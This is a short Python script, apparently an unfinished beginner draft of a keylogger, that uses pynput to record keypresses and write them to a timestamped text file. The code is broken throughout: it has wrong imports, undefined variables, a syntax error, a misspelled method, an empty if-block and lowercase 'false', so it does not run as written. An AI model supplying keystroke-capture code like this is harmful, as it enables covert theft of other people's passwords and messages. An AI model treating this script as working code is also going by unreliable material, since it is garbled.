
import os
import pynput 
import scipy
import time
from datetime import date

from pynput.keyboard import key , Listener


counter= 0 
character_array = []

def write_file(character_array):
    today = datetime.datetime.now()
    name = today.strtime("%Y-%m-%d %H:%M")

    with open("%s.txt" % name, "w") as f:
        for characters in character_array:
            f.write(characters)


def on_press(key):
     global character array, counter 

     key.append(key)
     count +=1
     
    print("[0] pressed".format(key))
    
    if count >=10:

def on_release(key):
    if key == key.esc:
        return false
#do some more research play around with listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()


